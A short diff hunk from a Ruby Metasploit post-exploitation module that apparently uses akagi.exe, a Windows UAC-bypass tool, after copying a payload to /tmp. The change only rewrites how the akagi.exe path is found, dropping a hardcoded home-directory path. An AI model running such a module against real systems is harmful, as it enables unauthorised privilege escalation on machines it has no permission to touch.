@@ -75,18 +75,18 @@ class MetasploitModule < Msf::Post
     print_good("Copied #{existing_payload} -> /tmp/#{payload_name}")
 
     # Get akagi.exe path - try multiple locations including env var
-    akagi_local = datastore['AKAGI_PATH']
-    if akagi_local.empty?
-      # Try default locations
-      ['/home/giovi/akagi.exe', '/root/.local/share/acheron-toolkit/bin/akagi.exe', 
-       ENV['ACHERON_TOOLKIT_DIR'] + '/bin/akagi.exe', 
-       ENV['HOME'] + '/.local/share/acheron-toolkit/bin/akagi.exe'].each do |path|
-        if ::File.exist?(path)
-          akagi_local = path
-          break
+        akagi_local = datastore['AKAGI_PATH']
+        if akagi_local.empty?
+          # Try default locations
+          [ENV['ACHERON_TOOLKIT_DIR'] + '/bin/akagi.exe',
+           ENV['HOME'] + '/.local/share/acheron-toolkit/bin/akagi.exe',
+           '/root/.local/share/acheron-toolkit/bin/akagi.exe'].each do |path|
+            if ::File.exist?(path)
+              akagi_local = path
+              break
+            end
+          end
         end
-      end
-    end
     
     unless akagi_local && ::File.exist?(akagi_local)
       print_error("akagi.exe not found! Set AKAGI_PATH option or place at default location.")
